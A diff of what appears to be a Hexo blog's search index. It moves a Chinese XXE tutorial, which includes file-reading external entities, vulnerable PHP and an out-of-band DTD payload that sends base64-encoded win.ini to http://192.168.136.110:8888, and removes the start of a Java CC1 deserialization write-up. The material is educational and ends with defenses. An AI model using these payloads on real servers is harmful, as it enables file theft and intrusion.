@@ -48,91 +48,6 @@
       </tags>
   </entry>
   <entry>
-    <title>XXE漏洞详解</title>
-    <url>/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h1 id="简介">简介</h1>
-<p>XXE(XML External Entity Injection) <code>XML外部实体注入</code>,之前听这个词听过很多次了,但由于平日里不管是ctf比赛或者是src遇到的都不多,所以一直没有详细的了解过,趁着假期空闲,决定好好学一下这方面的知识。</p>
-<p>XML一般可以用来做数据传输和数据存储,其传输功能和JSON类似,但现在基本使用JSON,很少使用XML,因为XML使用起来太“重”了,而外部实体引入是XML的一个正常功能,但如果在引入时,注入了恶意的外部实体,但本地对注入的外部实体未做严格校验,这时就会出现XXE漏洞。</p>
-<h1 id="XML基础">XML基础</h1>
-<p>要明白XXE,我们可以首先从XML基础学起。</p>
-<p>一个XML文档结构包括、<code>XML声明、文档类型定义DTD（可选）、文档元素</code>。</p>
-<p>例如下面这一段就是标准的XML文档</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">user</span> (<span class="keyword">username</span>, <span class="keyword">password</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">username</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">password</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="4d4d27c0633b434f8243f7d8b50a5ce2.png" alt=""></p>
-<p>通过DTD可以验证XML是否符合正确的语法规则 （DTD实际上类似一段说明文字,说明XML文档的组成元素及结构,如果这里将DTD中的username改为name,打开XML文档并不会报错,只是不符合DTD中定义的语法规则）,DTD可以本地声明,也可以外部引用,而XXE主要就是从DTD入手。</p>
-<h1 id="DTD实体">DTD实体</h1>
-<p>实体是<code>用于定义引用普通文本或特殊字符的快捷方式的变量</code>,可在内部或外部进行声明。</p>
-<p>实体包括<code>一般实体</code>和<code>参数实体</code>,为防止大家被绕晕,这里我们只讲一般实体。</p>
-<p>一般实体声明方式：<code>&lt;!ENTITY 名字 '内容'&gt;</code></p>
-<p>使用方式：<code>&amp;名字;</code></p>
-<p>例如：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在浏览器中打开</p>
-<p><img src="470a490266c14d9d8af3bc61cca3c847.png" alt=""></p>
-<p>而外部实体声明方式为： <code>&lt;!ENTITY 名字 SYSTEM &quot;URI/URL&quot;&gt;</code></p>
-<p>例如：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;admin.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>admin.txt中的内容如下<br>
-<img src="2f42b5236de848d99d31ff0d72379852.png" alt=""></p>
-<p>在IE8浏览器(其他浏览器显示不出来)中打开</p>
-<p><img src="3043d1c444e2426fbcede512168256e4.png" alt=""></p>
-<p>同时在引用外部实体时,可以使用不同的协议类型来引用 ：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">file:///path/file.txt</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=file.txt</span><br></pre></td></tr></table></figure>
-<p>聪明的你们一定已经发现了,只要将admin.txt换成其他文件,就可以实现文件的任意读取了</p>
-<h1 id="无回显的xxe">无回显的xxe</h1>
-<p>当服务端无回显时，可以通过远程加载dtd的方式读取文件</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>	</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.136.110:8888/1.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span>3;<span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;? 1.dtd ?&gt;</span><br><span class="line"><span class="meta">&lt;!iENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=file://C:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://192.168.136.110:8888/?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
-<h1 id="PHP中的XML">PHP中的XML</h1>
-<p>php中常见的与XML有关的函数是 <code>simplexml_load_string</code></p>
-<p>其用法为 <code>simplexml_load_file(string,class,options,ns,is_prefix)</code></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>string</td>
-<td>必需。规定要使用的 XML 字符串。</td>
-</tr>
-<tr>
-<td>class</td>
-<td>可选。规定新对象的 class。</td>
-</tr>
-<tr>
-<td>options</td>
-<td>可选。规定附加的 Libxml 参数。</td>
-</tr>
-<tr>
-<td>ns</td>
-<td>可选。</td>
-</tr>
-<tr>
-<td>is_prefix</td>
-<td>可选。</td>
-</tr>
-</tbody>
-</table>
-<p>一个简单的例子</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//通过php伪协议直接接收POST传参</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>, <span class="string">&quot;SimpleXMLElement&quot;</span>, LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;username;</span><br></pre></td></tr></table></figure>
-<p>利用XXE读取log.txt的内容<br>
-<img src="4d7a3d360f154acc92b406c30ac7e9e3.png" alt=""></p>
-<h1 id="防御">防御</h1>
-<p>XXE的防御一般通过两种方式<br>
-1.使用开发语言提供的禁用外部实体的方法, 例如php中使用<code>libxml_disable_entity_loader(true)</code><br>
-2.对用户输入的内容进行过滤,过滤掉<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>,或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>xxe</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>利用ipv6实现公网ip</title>
     <url>/post/Using-ipv6-to-realize-public-ip/</url>
     <content><![CDATA[<h3 id="背景"><strong>背景</strong></h3>
@@ -267,6 +182,97 @@
       </tags>
   </entry>
   <entry>
+    <title>新年好</title>
+    <url>/post/happy-new-year/</url>
+    <content><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>XXE漏洞详解</title>
+    <url>/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h1 id="简介">简介</h1>
+<p>XXE(XML External Entity Injection) <code>XML外部实体注入</code>,之前听这个词听过很多次了,但由于平日里不管是ctf比赛或者是src遇到的都不多,所以一直没有详细的了解过,趁着假期空闲,决定好好学一下这方面的知识。</p>
+<p>XML一般可以用来做数据传输和数据存储,其传输功能和JSON类似,但现在基本使用JSON,很少使用XML,因为XML使用起来太“重”了,而外部实体引入是XML的一个正常功能,但如果在引入时,注入了恶意的外部实体,但本地对注入的外部实体未做严格校验,这时就会出现XXE漏洞。</p>
+<h1 id="XML基础">XML基础</h1>
+<p>要明白XXE,我们可以首先从XML基础学起。</p>
+<p>一个XML文档结构包括、<code>XML声明、文档类型定义DTD（可选）、文档元素</code>。</p>
+<p>例如下面这一段就是标准的XML文档</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">user</span> (<span class="keyword">username</span>, <span class="keyword">password</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">username</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">password</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="4d4d27c0633b434f8243f7d8b50a5ce2.png" alt=""></p>
+<p>通过DTD可以验证XML是否符合正确的语法规则 （DTD实际上类似一段说明文字,说明XML文档的组成元素及结构,如果这里将DTD中的username改为name,打开XML文档并不会报错,只是不符合DTD中定义的语法规则）,DTD可以本地声明,也可以外部引用,而XXE主要就是从DTD入手。</p>
+<h1 id="DTD实体">DTD实体</h1>
+<p>实体是<code>用于定义引用普通文本或特殊字符的快捷方式的变量</code>,可在内部或外部进行声明。</p>
+<p>实体包括<code>一般实体</code>和<code>参数实体</code>,为防止大家被绕晕,这里我们只讲一般实体。</p>
+<p>一般实体声明方式：<code>&lt;!ENTITY 名字 '内容'&gt;</code></p>
+<p>使用方式：<code>&amp;名字;</code></p>
+<p>例如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在浏览器中打开</p>
+<p><img src="470a490266c14d9d8af3bc61cca3c847.png" alt=""></p>
+<p>而外部实体声明方式为： <code>&lt;!ENTITY 名字 SYSTEM &quot;URI/URL&quot;&gt;</code></p>
+<p>例如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;admin.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>admin.txt中的内容如下<br>
+<img src="2f42b5236de848d99d31ff0d72379852.png" alt=""></p>
+<p>在IE8浏览器(其他浏览器显示不出来)中打开</p>
+<p><img src="3043d1c444e2426fbcede512168256e4.png" alt=""></p>
+<p>同时在引用外部实体时,可以使用不同的协议类型来引用 ：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">file:///path/file.txt</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=file.txt</span><br></pre></td></tr></table></figure>
+<p>聪明的你们一定已经发现了,只要将admin.txt换成其他文件,就可以实现文件的任意读取了</p>
+<h1 id="无回显的xxe">无回显的xxe</h1>
+<p>当服务端无回显时，可以通过远程加载dtd的方式读取文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>	</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.136.110:8888/1.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span>3;<span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;? 1.dtd ?&gt;</span><br><span class="line"><span class="meta">&lt;!iENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=file://C:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://192.168.136.110:8888/?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
+<h1 id="PHP中的XML">PHP中的XML</h1>
+<p>php中常见的与XML有关的函数是 <code>simplexml_load_string</code></p>
+<p>其用法为 <code>simplexml_load_file(string,class,options,ns,is_prefix)</code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string</td>
+<td>必需。规定要使用的 XML 字符串。</td>
+</tr>
+<tr>
+<td>class</td>
+<td>可选。规定新对象的 class。</td>
+</tr>
+<tr>
+<td>options</td>
+<td>可选。规定附加的 Libxml 参数。</td>
+</tr>
+<tr>
+<td>ns</td>
+<td>可选。</td>
+</tr>
+<tr>
+<td>is_prefix</td>
+<td>可选。</td>
+</tr>
+</tbody>
+</table>
+<p>一个简单的例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//通过php伪协议直接接收POST传参</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>, <span class="string">&quot;SimpleXMLElement&quot;</span>, LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;username;</span><br></pre></td></tr></table></figure>
+<p>利用XXE读取log.txt的内容<br>
+<img src="4d7a3d360f154acc92b406c30ac7e9e3.png" alt=""></p>
+<h1 id="防御">防御</h1>
+<p>XXE的防御一般通过两种方式<br>
+1.使用开发语言提供的禁用外部实体的方法, 例如php中使用<code>libxml_disable_entity_loader(true)</code><br>
+2.对用户输入的内容进行过滤,过滤掉<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>,或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>xxe</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/post/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -363,14 +369,8 @@
         <category>技术</category>
       </categories>
       <tags>
-        <tag>java</tag>
+        <tag>内存马</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>新年好</title>
-    <url>/post/happy-new-year/</url>
-    <content><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>
-]]></content>
   </entry>
   <entry>
     <title>java反序列化之RMI</title>
@@ -870,66 +870,6 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
-    <title>java反序列化之动态代理,cc1和cc6</title>
-    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86,cc1%E5%92%8Ccc6/</url>
-    <content><![CDATA[<h1 id="动态代理">动态代理</h1>
-<p><code>Java动态代理</code>是一种在运行时生成代理对象的机制,它可以在运行时动态地创建一个实现特定接口的代理类,并将所有调用委托给处理器。</p>
-<p>在Java中,动态代理由java.lang.reflect包中的<code>Proxy类</code>和<code>InvocationHandler接口</code>提供支持。要创建动态代理,首先必须定义一个实现InvocationHandler接口的类,该接口只有一个方法invoke(Object proxy, Method method, Object[]  args),它会在代理对象上调用任何方法时被调用。然后,使用Proxy.newProxyInstance()方法来创建代理对象,该方法需要传递一个<code>ClassLoader对象</code>、<code>一组接口</code>以及一个<code>InvocationHandler对象</code>作为参数。</p>
-<p>当代理对象上调用方法时,代理对象将委托给InvocationHandler对象的<code>invoke()</code>方法来处理该方法的调用。在invoke()方法内部,可以根据需要执行其他逻辑,例如记录日志或者进行权限检查,然后再将请求转发给实际的目标对象。这样就可以实现动态代理的功能。</p>
-<p>示例代码：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义InvocationHandler实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Before Method Invoke&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;After Method Invoke&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建目标对象</span></span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建InvocationHandler实现类</span></span><br><span class="line">        <span class="type">MyInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyInvocationHandler</span>(hello);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理对象</span></span><br><span class="line">        <span class="type">Hello</span> <span class="variable">proxy</span> <span class="operator">=</span> (Hello) Proxy.newProxyInstance(</span><br><span class="line">                hello.getClass().getClassLoader(),</span><br><span class="line">                hello.getClass().getInterfaces(),</span><br><span class="line">                handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用动态代理对象的方法</span></span><br><span class="line">        proxy.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>输出：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before Method Invoke</span><br><span class="line">Hello World</span><br><span class="line">After Method Invoke</span><br></pre></td></tr></table></figure>
-<p>由于<code>不论我们调用任何动态代理对象方法都会执行invoke方法</code>,所以为我们的反序列化利用提供了便利</p>
-<h1 id="CC1链">CC1链</h1>
-<p>我们之前最终的利用链是</p>
-<p>AnnotationInvocationHandler.readObject()-&gt;AbstractInputCheckedMapDecorator.MapEntry.setValue()-&gt;TransformedMap.checkSetValue()-&gt;ChainedTransformer.transform()</p>
-<p>我们一开始在查找有谁调用了InvokerTransformer.transform()方法的时候找的是TransformedMap的checkSetValue方法,但实际上还有很多其他的调用方法,例如在<code>LazyMap</code>中的<code>get</code>方法也调用了InvokerTransformer.transform()</p>
-<p><img src="image-20230323132610636.png" alt="image-20230323132610636"></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>那我们就可以针对这一条链进行尝试</p>
-<p>调用了get的方法很多,这里我们发现在AnnotationInvocationHandler的invoke方法里也调用了get方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);<span class="comment">//调用了get方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">        result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里就涉及到了动态加载</p>
-<p>于是我们需要创建一个动态代理对象,代码如下</p>
